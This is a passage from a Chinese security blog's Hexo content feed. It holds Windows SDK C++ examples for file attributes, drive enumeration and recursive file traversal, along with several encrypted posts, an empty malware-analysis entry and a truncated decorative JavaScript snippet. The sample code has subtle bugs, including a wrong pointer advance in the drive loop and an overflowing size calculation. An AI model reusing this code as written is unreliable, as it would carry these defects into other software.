class="table-container"><table><thead><tr><th>DeleteFile</th><th>删除文件</th></tr></thead><tbody><tr><td>CopyFile</td><td>拷贝文件</td></tr><tr><td>MoveFile</td><td>移动文件</td></tr><tr><td>CreateFile</td><td>打开文件</td></tr><tr><td>GetFileSize</td><td>获取文件大小</td></tr><tr><td>ReadFile</td><td>读取文件</td></tr><tr><td>CloseHandle</td><td>关闭文件</td></tr><tr><td>FindFirstFile</td><td>查找第一个文件</td></tr><tr><td>FindNextFile</td><td>查找下一个文件</td></tr><tr><td>WriteFile</td><td>写入数据</td></tr></tbody></table></div><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyEnumFile</span><span class="params">(<span class="type">const</span> TCHAR * szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WIN32_FIND_DATA wfd = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hFind =  <span class="built_in">FindFirstFile</span>(szPath, &amp;wfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFind!=INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件夹：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//MyEnumFile();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFind, &amp;wfd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 删除文件</span></span><br><span class="line"><span class="comment">//DeleteFile(_T(&quot;D:\\hehe\\haha.txt&quot;));</span></span><br><span class="line"><span class="comment">//2. 拷贝文件</span></span><br><span class="line"><span class="comment">//CopyFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\123.txt&quot;),TRUE);</span></span><br><span class="line"><span class="comment">//3. 移动文件</span></span><br><span class="line"><span class="comment">//MoveFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\nihao.txt&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 打开文件 进行读写  fread   fwrite</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">_T(<span class="string">&quot;D:/hehe/123/haha.txt&quot;</span>),            <span class="comment">//路径</span></span><br><span class="line">GENERIC_READ | GENERIC_WRITE, <span class="comment">//打开的权限</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//共享模式</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//安全属性</span></span><br><span class="line">OPEN_EXISTING,                <span class="comment">//</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,        <span class="comment">//普通属性</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取文件大小，申请相应的缓冲区空间</span></span><br><span class="line">DWORD dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="type">char</span>* pbuf = <span class="keyword">new</span> <span class="type">char</span>[dwSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pbuf, dwSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5. 查看文件的属性</span></span><br><span class="line"><span class="comment">//5.1 基本属性</span></span><br><span class="line">DWORD dwAttribute = <span class="built_in">GetFileAttributes</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dwAttribute&amp; FILE_ATTRIBUTE_HIDDEN)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个文件是隐藏的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_READONLY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这个文件是只读的&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA wfad = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetFileAttributesEx</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>), GetFileExInfoStandard, &amp;wfad);</span><br><span class="line"><span class="comment">//5.2 扩展属性</span></span><br><span class="line">wfad.ftCreationTime;<span class="comment">//这里获取到的是时间戳</span></span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;wfad.ftCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 枚举某一个文件夹下的文件</span></span><br><span class="line"><span class="built_in">MyEnumFile</span>(_T(<span class="string">&quot;D:\\*&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历盘符"><a href="#遍历盘符" class="headerlink" title="遍历盘符"></a>遍历盘符</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="type">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//wprintf(_T(&quot;%s  &quot;), pTemp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = Flag;</span><br><span class="line">li.pszText = pTemp;</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;可移动设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;硬盘&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;远程设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;光驱&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyDlg2::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//每次遍历都得置0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">dwConstSize1 = <span class="number">0</span>;</span><br><span class="line">dwConstSize2 = <span class="number">0</span>;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = <span class="built_in">FindFirstFile</span>(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnumFile</span>(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_FileList.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line">cs.<span class="built_in">Format</span>(<span class="string">L&quot;%d kb&quot;</span>, dwSize/<span class="number">1024</span>);</span><br><span class="line">m_FileList.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(<span class="string">L&quot;.exe&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.obj&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.tlog&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.idb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pdb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.res&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ilk&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.sdf&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ipch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.log&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.lastbuildstate&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.<span class="built_in">Format</span>(<span class="string">L&quot;%s\\%s&quot;</span> , filePath,fileData.cFileName);</span><br><span class="line"></span><br><span class="line">path.<span class="built_in">push_back</span>(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_FileList2.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">m_FileList2.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line">dwConstSize2 += dwSize / <span class="number">1024</span>;</span><br><span class="line">j ++;</span><br><span class="line">&#125;</span><br><span class="line">dwConstSize1 += dwSize / <span class="number">1024</span>;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web应急响应工具</title>
      <link href="/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ec023c4f2e38992916e495ca08e39f0bb37eda8d5004c0d46c550e55707e674e">48e22157b1ef105701eba779d55791b90cb472c4abb9e1c602a2918b0f53652a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是容易感染的</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web应急响应工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>病毒分析之Peyta.exe</title>
      <link href="/2022/11/23/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E4%B9%8BPeyta-exe/"/>
      <url>/2022/11/23/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E4%B9%8BPeyta-exe/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向开发</title>
      <link href="/2022/11/23/%E9%80%86%E5%90%91%E5%BC%80%E5%8F%91/"/>
      <url>/2022/11/23/%E9%80%86%E5%90%91%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f122c13a37b3be67edb431ecedff534858b59d9be9c19fbcfe8005a0a11a4444">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7cc5df4f7b8f52ad882566aeff2b4a49d1b625e109a26ad668051010862ede946ff0391c9929bbc58c30a83a055848909b1df8a84ee90595008555f012a5a264840789cb6be094949ea640fd9ce3db9e686c95553e577ce9b16a865273a1894a955130474f21b556347957973646c7af9d74fdb295fb3aca91bf356f9adbc9f6616d299bfd2435a722cb94ffa144df2b60c1dff58d52a9e3d5b5b1d65a3b50558</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> x86汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础</title>
      <link href="/2022/11/23/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/11/23/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e9ca6ae583fa4fd37817c4420e9028b6f004bac971b1ccd8f2171191b1452d56">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f74485859460137d1a7fe0ec79cd18eff571553a63ff4f450066a8af5ebf55a5b29d344399136c1600a8c3e03dd5e29397af5a0c5f29c1759c37daf3beab728abcf11984ddad6ffcee8c0395acdbe0ce21f8d0838eb2ddc4279098524b548fc9ef55837a9526c5f09bc6a5e59e3cb9cde231cf52b3bf121a3eb536cd970d5bcbc4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试PDF</title>
      <link href="/2022/11/23/%E6%B5%8B%E8%AF%95PDF/"/>
      <url>/2022/11/23/%E6%B5%8B%E8%AF%95PDF/</url>
      
        <content type="html"><![CDATA[<h1 id="测试PDF"><a href="#测试PDF" class="headerlink" title="测试PDF"></a>测试PDF</h1><p> <a href="测试PDF\CommonsCollections6.pdf">CommonsCollections6.pdf</a> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span> <span class="attr">id</span>=<span class="string">&quot;colortap1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> colortap = <span class="keyword">function</span> (<span class="params">r</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;<span class="keyword">return</span> b[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * b.<span class="property">length</span>)]&#125;  </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">e</span>(<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>() + <span class="number">33</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">r</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> n=<span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>(),i=<span class="number">0</span>;r&gt;i;i++)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> l=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">l.<span class="property">textContent</span>=<span class="title function_">e</span>(),l.<span class="property">style</span>.<span class="property">color</span>=<span class="title function_">t</span>(),n.<span class="title function_">appendChild</span>(l)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> n;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t = o[c.<span class="property">skillI</span>];</span></span><br><span class="line"><span class="language-javascript">c.<span class="property">step</span> ? c.<span 